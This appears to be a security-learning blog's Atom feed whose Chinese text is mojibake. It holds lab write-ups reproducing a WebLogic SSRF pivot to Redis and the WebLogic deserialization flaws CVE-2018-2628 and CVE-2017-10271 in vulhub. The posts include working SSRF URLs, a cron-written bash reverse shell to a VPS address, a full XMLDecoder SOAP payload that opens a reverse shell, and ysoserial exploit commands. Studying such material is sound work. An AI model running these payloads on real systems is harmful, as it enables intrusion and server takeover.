<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>redfishçš„å­¦ä¹ ç¬”è®°</title>
  
  <subtitle>redfishçš„å­¦ä¹ ç¬”è®°</subtitle>
  <link href="https://redredredfish.github.io/atom.xml" rel="self"/>
  
  <link href="https://redredredfish.github.io/"/>
  <updated>2021-12-21T18:16:21.034Z</updated>
  <id>https://redredredfish.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulhub weblogic ssrfå¤ç°</title>
    <link href="https://redredredfish.github.io/2021/11/20/vulhub-weblogic-ssrf%E5%A4%8D%E7%8E%B0/"/>
    <id>https://redredredfish.github.io/2021/11/20/vulhub-weblogic-ssrf%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-11-19T18:05:00.000Z</published>
    <updated>2021-12-21T18:16:21.034Z</updated>
    
    <content type="html"><![CDATA[<p>VPS:x.x.x.x</p><p>è·³æ¿æœºdebianï¼š192.168.130.129 weblogic</p><p>å†…ç½‘ubuntuï¼š192.168.130.132 redis</p><p>1ã€operatorå‚æ•°å¯ä»¥è°ƒç”¨å¤–éƒ¨urlï¼Œç”±äºæœªåšé™åˆ¶ï¼Œé€ æˆssrfï¼Œå¯ä»¥å€ŸåŠ©å®ƒæ¢æµ‹æœåŠ¡å™¨ç«¯å£ï¼Œå¦‚ä¸‹ä¸¤ç§ä¸åŒçš„æŠ¥é”™</p><p><a href="http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001">http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</a></p><p><a href="http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:3389">http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:3389</a></p><p>2ã€é€šè¿‡ssrfæ¢æµ‹å†…ç½‘ä¸»æœºï¼Œå‘ç°å†…ç½‘ä¸»æœº192.168.130.132å¼€å¯6379ä¸”å­˜åœ¨redisæœªæˆæƒï¼Œå¯ä»¥é€šè¿‡httpçš„getè¯·æ±‚å†™å…¥shell</p><p>ä¸ºä»€ä¹ˆgetè¯·æ±‚èƒ½å†™shell</p><blockquote><p>1ã€redisæœªæˆæƒ </p></blockquote><blockquote><p>2ã€redisé€šè¿‡æ¢è¡Œç¬¦(\r\n)æ¥åˆ†éš”å‘½ä»¤ </p></blockquote><blockquote><p>3ã€ç›®æ ‡ä¸»æœºå¼€å¯å®šæ—¶ä»»åŠ¡</p></blockquote><p>3ã€VPSç›‘å¬6666ç«¯å£</p><p><code>root@iZbp1h497hkijddeblcm8jZ:~# nc -lvp 6666 Listening on [0.0.0.0] (family 0, port 6666)</code></p><p>4ã€getå†™å®šæ—¶ä»»åŠ¡ shell /etc/crontab</p><p><code>set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/VPS:ip/6666 0&gt;&amp;1&#39;\n\n\n\n&quot;</code></p><p><code>config set dir /etc/</code></p><p><code>config set dbfilename crontab</code></p><p><code>save</code></p><p>å‘½ä»¤ä¹‹é—´ç”¨\r\nåˆ†éš”ï¼Œurlç¼–ç %0D%0Aï¼Œå…¨éƒ¨urlç¼–ç </p><p><code>set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F47.97.50.242%2F6666%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A</code></p><p>5ã€ä¼ å‚ï¼Œåå¼¹shell</p><p><strong>é‡åˆ°çš„å‘</strong></p><blockquote><p>1.å®šæ—¶ä»»åŠ¡ä¸ä¸€å®šä¼šæ‰§è¡Œ </p></blockquote><blockquote><p>2.ä¸åŒç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›®å½•ä¸ä¸€æ · </p></blockquote><blockquote><p>/etc/crontab #å¤§éƒ¨åˆ†linux </p></blockquote><blockquote><p>/etc/cron.d/ #ubuntu</p></blockquote><blockquote><p>/var/spool/cron/root #centOS </p></blockquote><blockquote><p>/var/spool/cron/crontabs/root #debian</p></blockquote><blockquote><p>3.ä¸å¤ªç†è§£READMEé‡Œçš„shellæœ€åä¸ºå•¥è¦åŠ ä¸ªaaa</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;VPS:x.x.x.x&lt;/p&gt;
&lt;p&gt;è·³æ¿æœºdebianï¼š192.168.130.129 weblogic&lt;/p&gt;
&lt;p&gt;å†…ç½‘ubuntuï¼š192.168.130.132 redis&lt;/p&gt;
&lt;p&gt;1ã€operatorå‚æ•°å¯ä»¥è°ƒç”¨å¤–éƒ¨urlï¼Œç”±äºæœªåšé™åˆ¶ï¼Œé€ æˆssrfï¼Œå¯ä»¥</summary>
      
    
    
    
    <category term="webæ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="ssrf" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/ssrf/"/>
    
    
    <category term="ssrf" scheme="https://redredredfish.github.io/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£(äºŒ)</title>
    <link href="https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%BA%8C/"/>
    <id>https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%BA%8C/</id>
    <published>2021-07-08T07:18:00.000Z</published>
    <updated>2021-12-06T07:19:19.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h2><p>æ¥ç€ä¸Šç¯‡ï¼Œè¿™æ¬¡å¤ç°ç»å…¸çš„weblogicååºåˆ—åŒ–æ¼æ´â€”CVE-2018-2628<br>å±äºåˆ©ç”¨T3åè®®é…åˆRMPæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚<br>åŒæ ·å…ˆåˆ©ç”¨vulhubå¿«é€Ÿå¤ç°ï¼Œç„¶åå†æ¥çœ‹çœ‹åŸç†ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a><strong>æ¼æ´å¤ç°</strong></h2><p><strong>CVE-2018-2628</strong></p><p>å½±å“èŒƒå›´ï¼š10.3.6.0ã€12.1.3.0ã€12.2.1.2ã€12.2.1.3</p><p>dockerå¼€å¯ç¯å¢ƒ</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/vulhub/weblogic/CVE<span class="number">-2018</span><span class="number">-2628</span># docker-compose up -d</span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨è®¿é—®localhost:7001/consoleï¼Œå‡ºç°weblogicçš„ç™»å½•ç•Œé¢ï¼Œè¯´æ˜ç¯å¢ƒå·²ç»æ­å¥½äº† (â•¹Ú¡â•¹ )vulhub yyds!<br><img src="https://img-blog.csdnimg.cn/2a955af9856043f692be35fe513c9817.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯ä»¥çœ‹åˆ°weblogicçš„ç‰ˆæœ¬æ˜¯10.3.6.0<br><img src="https://img-blog.csdnimg.cn/a557cec6b40e404dbf4e3af94f706638.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ©ç”¨ysoserialå¯åŠ¨ä¸€ä¸ªJRMP ServeræœåŠ¡ç›‘å¬<br>è¿™é‡Œæ’ä¸€å¥ç¼–è¯‘ysoserialæ³¨æ„JDKç‰ˆæœ¬ä¸è¦è¿‡é«˜ï¼Œå»ºè®®åœ¨1.7u21ä»¥ä¸‹ï¼Œå¡äº†å¥½ä¹…â”—|ï½€Oâ€²|â”›</p><p>å¼€å¯ç›‘å¬ï¼Œå‘½ä»¤æ‰§è¡Œè¿™é‡Œè€åŠæ³•ï¼Œå°è¯•æ–°å»ºä¸€ä¸ªshellæ–‡ä»¶ï¼Œæ¯”è¾ƒç›´è§‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial<span class="number">-0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener ç«¯å£ CommonsCollections1 <span class="string">&quot;touch /tmp/shell&quot;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨vulhubæä¾›çš„<a href="https://www.exploit-db.com/exploits/44553">expè„šæœ¬</a>ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œä¿å­˜åœ¨ysoserial-0.0.6-SNAPSHOT-all.jaråŒç›®å½•ä¸‹<br><img src="https://img-blog.csdnimg.cn/7321d6da71cd498d8f66c70b27f8dd2a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰§è¡Œexp</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE<span class="number">-2018</span><span class="number">-2628</span><span class="built_in">exp</span>.py [å¼€å¯weblogicçš„IP] [ç«¯å£] ysoserial<span class="number">-0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar [å¼€å¯JRMP Serverçš„IP] [ç›‘å¬ç«¯å£] JRMPClient</span><br></pre></td></tr></table></figure><p>expå¼€å§‹è·‘ï¼Œç›‘å¬æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/9e7864110b8344daaebcd3277cc76204.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/67d1250a0726414a93310e30ce2a5210.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_9,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>expè·‘å®Œï¼Œè¿›å…¥dockerå®¹å™¨æŸ¥çœ‹æ–‡ä»¶æ˜¯å¦åˆ›å»ºæˆåŠŸ</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/vulhub/weblogic/CVE<span class="number">-2018</span><span class="number">-2628</span># docker-compose exec weblogic bash</span><br></pre></td></tr></table></figure><p>å¤ç°å®Œæˆ<br><img src="https://img-blog.csdnimg.cn/3402a535775d4a249ee1f159048a9af0.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h2><p>çœ‹ä¸€ä¸‹å®˜æ–¹çš„æ¼æ´ç®€ä»‹</p><blockquote><p>Oracle WebLogic Serveræ˜¯ç¾å›½ç”²éª¨æ–‡ï¼ˆOracleï¼‰å…¬å¸çš„ä¸€æ¬¾é€‚ç”¨äºäº‘ç¯å¢ƒå’Œä¼ ç»Ÿç¯å¢ƒçš„åº”ç”¨æœåŠ¡å™¨ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªç°ä»£è½»å‹å¼€å‘å¹³å°ï¼Œæ”¯æŒåº”ç”¨ä»å¼€å‘åˆ°ç”Ÿäº§çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œå¹¶ç®€åŒ–äº†åº”ç”¨çš„éƒ¨ç½²å’Œç®¡ç†ã€‚WLS Coreæ˜¯å…¶ä¸­çš„ä¸€ä¸ªæ ¸å¿ƒç»„ä»¶ã€‚ Oracle WebLogic Serverä¸­çš„WLSæ ¸å¿ƒç»„ä»¶å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ”»å‡»è€…å¯é€šè¿‡è¿œç¨‹å‘é€æ”»å‡»æ•°æ®ï¼Œå€ŸåŠ©T3åè®®åœ¨WebLogic Serverä¸­æ‰§è¡Œååºåˆ—åŒ–æ“ä½œåˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»£ç ã€‚</p></blockquote><p>é¦–å…ˆéœ€è¦ææ‡‚å•¥æ˜¯T3åè®®</p><blockquote><p>T3åè®®ï¼šWebLogic Server ä¸­çš„ RMI(è¿œç¨‹æ–¹æ³•è°ƒç”¨)é€šä¿¡ä½¿ç”¨ T3 åè®®åœ¨ WebLogic Server å’Œå…¶ä»– Java ç¨‹åºï¼ˆåŒ…æ‹¬å®¢æˆ·ç«¯åŠå…¶ä»– WebLogic Server å®ä¾‹ï¼‰é—´ä¼ è¾“æ•°æ®ã€‚<br>JRMP ServeræœåŠ¡ï¼šjavaè¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®</p></blockquote><p>åˆ©ç”¨nmapå¿«é€Ÿæ£€æµ‹T3åè®®æ˜¯å¦å¼€æ”¾</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV IP <span class="comment">--script=weblogic-t3-info.nse -p 7001</span></span><br></pre></td></tr></table></figure><p>å¤§è‡´æµç¨‹<br><img src="https://img-blog.csdnimg.cn/28e34310f8614403a4f5e1c9690ee7a0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç»“åˆexpæ¥çœ‹<br>ä¸»å‡½æ•°å¾ˆçŸ­ï¼Œæ¥æ”¶JRMPå‚æ•°ï¼Œæ‰§è¡Œexploitå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/84f732105d204066bafd1397f1a46e7b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>exploitä¸­ï¼Œçœ‹åå­—t3_handshakeå’Œbuild_t3_request_objectåº”è¯¥æ˜¯å»ºç«‹T3è¿æ¥ï¼Œgenerate_payloadåº”è¯¥æ˜¯åºåˆ—åŒ–æ•°æ®,send_payload_objdataè‡ªç„¶å°±æ˜¯å‘é€æ•°æ®åŒ…äº†<br><img src="https://img-blog.csdnimg.cn/370052b335a348ab9ea093ec9679439a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å‘é€T3åè®®å¤´æ•°æ®åŒ…<br><img src="https://img-blog.csdnimg.cn/b619f7664afe479d946a0e518c63d52c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ„é€ åºåˆ—åŒ–æ•°æ®åŒ…å¹¶å‘é€<br><img src="https://img-blog.csdnimg.cn/9b4dc7845c604db68c837ed3f8ee405f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h2><p>æ‰“è¡¥ä¸<br>å¯¹T3åè®®è¿›è¡Œè®¿é—®æ§åˆ¶</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/afanti/p/10256840.html">https://www.cnblogs.com/afanti/p/10256840.html</a><br><a href="https://blog.csdn.net/u014715599/article/details/85256193">https://blog.csdn.net/u014715599/article/details/85256193</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;&lt;strong&gt;å‰è¨€&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;æ¥ç€ä¸Šç¯‡ï¼Œè¿™æ¬¡å¤ç°ç»å…¸çš„weblogicååºåˆ—åŒ–æ¼æ´â€”CVE-2018-2628&lt;br&gt;å±äºåˆ©ç”¨T3åè®®é…</summary>
      
    
    
    
    <category term="webæ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="ååºåˆ—åŒ–æ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="ååºåˆ—åŒ–æ¼æ´" scheme="https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="weblogicååºåˆ—åŒ–" scheme="https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>weblogicååºåˆ—åŒ–æ¼æ´çš„åˆçº§ç†è§£(ä¸€)</title>
    <link href="https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/"/>
    <id>https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/</id>
    <published>2021-07-08T03:07:00.000Z</published>
    <updated>2021-12-06T03:09:51.923Z</updated>
    
    <content type="html"><![CDATA[<p><strong>å•¥æ˜¯weblogic</strong></p><blockquote><p>WebLogicæ˜¯Oracleå‘å¸ƒçš„ä¸€ä¸ªåŸºäºJAVAEEæ¶æ„çš„webä¸­é—´ä»¶<br>å¤§æ¦‚å¯ä»¥ç†è§£ä¸ºtomcat pro maxğŸ™ƒ</p></blockquote><p><strong>Weblogicååºåˆ—åŒ–æ¼æ´çš„å‡ ä¸ªåˆ©ç”¨é˜¶æ®µ</strong><br>ä»åˆ©ç”¨æ–¹å¼æ¥çœ‹,åˆ†ä¸ºä¸‰ç±»</p><blockquote><p>1.ç›´æ¥é€šè¿‡T3åè®®å‘é€æ¶æ„ååºåˆ—åŒ–å¯¹è±¡(CVE-2015-4582ã€CVE-2016-0638ã€CVE-2016-3510ã€CVE-2020-2555ã€CVE-2020-2883)<br>2.åˆ©ç”¨T3åè®®é…åˆRMPæˆ–NDæ¥å£åå‘å‘é€ååºåˆ—åŒ–æ•°æ®(CVE2017-3248ã€CVE2018-2628ã€CVE2018-2893ã€CVE2018-3245ã€CVE-2018-3191ã€CVE-2020-14644ã€CVE-2020-14645)è¿˜æœ‰åˆ©ç”¨IIOPåè®®çš„CVE-2020-2551<br>3.é€šè¿‡ javabean XMLæ–¹å¼å‘é€ååºåˆ—åŒ–æ•°æ®ã€‚(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p></blockquote><p><strong>æ¼æ´å¤ç°</strong><br>ç”±äºæ¼æ´ä¼—å¤šï¼Œæ­å»ºç¯å¢ƒæ¯”è¾ƒå¤æ‚ï¼Œè¿˜æ˜¯å…ˆåˆ©ç”¨vulhubä¸­çš„CVE-2017-10271ã€CVE-2018-2628ã€CVE-2018-2894ã€CVE-2020-14882å‡ ä¸ªæ ‡å¿—æ€§çš„æ¼æ´ç¯å¢ƒè¿›è¡Œå¤ç°ã€‚</p><p>å…ˆä»æœ€å¤è€çš„å¼€å§‹</p><p><strong>CVE-2017-10271</strong></p><p>å½±å“èŒƒå›´ï¼š10.3.6.0.0ï¼Œ12.1.3.0.0ï¼Œ12.2.1.1.0ï¼Œ12.2.1.2.0</p><p>dockerå¼€å¯ç¯å¢ƒ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/vulhub/weblogic/CVE<span class="literal">-2017</span><span class="literal">-10271</span><span class="comment"># docker-compose up -d</span></span><br></pre></td></tr></table></figure><p>è¿œå¤ç‰ˆæœ¬ï¼Œç¯å¢ƒå¥½å¤§å…ˆå¿ä¸€ä¸‹</p><p>ç­‰å¾…çš„è¿‡ç¨‹ä¸­å…ˆç†è§£ä¸€ä¸‹æ¼æ´åŸç†ä»¥åŠvulhubç»™å‡ºçš„poc</p><blockquote><p>è¯¥æ¼æ´ä¸»è¦é’ˆå¯¹weblogicçš„WLS-WebServicesç»„ä»¶<br>å±äºä¸Šè¿°ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨çš„ç¬¬ä¸‰ç±»<br>å¤§è‡´çš„åŸç†é€šè¿‡ä¼ è¾“javabean XMLæ–¹å¼æ„é€ æ¶æ„XMLæ•°æ®é€ æˆä»£ç æ‰§è¡Œ</p></blockquote><p>ç»“åˆpocæ¥çœ‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_131&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/ip/port 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æ˜¯å‘ç½‘ç«™çš„/wls-wsat/CoordinatorPortTypeè·¯å¾„ä¼ å…¥xmlæ•°æ®ï¼Œè¿™ä¸²xmlç›®çš„æ˜¯åå¼¹shell<br><img src="https://img-blog.csdnimg.cn/e2500d2d3ddb4d49bbdf14acc368c5ab.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_15,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>OKï¼Œç¯å¢ƒèµ·å¥½å¼€å§‹å¤ç°</p><p>è®¿é—®localhost:7001/wls-wsat/CoordinatorPortTypeï¼Œæ˜¾ç¤ºwls-wsatç»„ä»¶çš„ä¸€äº›é…ç½®ä¿¡æ¯ï¼Œè¡¨ç¤ºæœåŠ¡å·²ç»å¼€å¯<br><img src="https://img-blog.csdnimg.cn/eed3402dcce94654be96b6284ffe06d3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_47,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœ¬åœ°ç›‘å¬6666ç«¯å£</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/<span class="comment"># nc -l -p 6666</span></span><br></pre></td></tr></table></figure><p>bpæŠ“åŒ…é‡æ”¾æ„é€ å¥½çš„æ•°æ®åŒ…ï¼Œæ³¨æ„å­—æ®µContent-Typeæ”¹ä¸ºtext/xml<br><img 